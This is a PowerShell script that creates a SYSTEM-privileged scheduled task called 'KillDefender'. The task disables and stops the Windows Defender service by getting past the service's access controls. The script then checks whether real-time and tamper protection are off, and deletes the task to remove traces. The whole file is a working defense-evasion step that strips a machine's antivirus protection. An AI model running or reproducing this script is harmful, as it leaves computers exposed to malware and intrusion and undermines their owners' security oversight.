# Create a SYSTEM scheduled task to stop+disable WinDefend (SYSTEM can bypass the service ACL)
$ErrorActionPreference = 'Continue'
$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoProfile -Command \"Set-Service WinDefend -StartupType Disabled -Force; Stop-Service WinDefend -Force; sc.exe config WinDefend start= disabled; sc.exe stop WinDefend\""
$principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
Register-ScheduledTask -TaskName 'KillDefender' -Action $action -Principal $principal -Force -ErrorAction SilentlyContinue | Out-Null
Start-ScheduledTask -TaskName 'KillDefender'
Start-Sleep -Seconds 8
# Report
$svc = Get-Service WinDefend -ErrorAction SilentlyContinue
if ($svc) {
  $sm = (Get-CimInstance Win32_Service -Filter "Name='WinDefend'" -ErrorAction SilentlyContinue).StartMode
  Write-Output "AFTER WINDEFEND=$($svc.Status)|startmode=$sm"
}
$st = Get-MpComputerStatus -ErrorAction SilentlyContinue
if ($st) { Write-Output "AFTER RTP=$($st.RealTimeProtectionEnabled) TP=$($st.IsTamperProtected) AV=$($st.AntivirusEnabled)" }
# Cleanup task
Unregister-ScheduledTask -TaskName 'KillDefender' -Confirm:$false -ErrorAction SilentlyContinue
Write-Output "DONE"
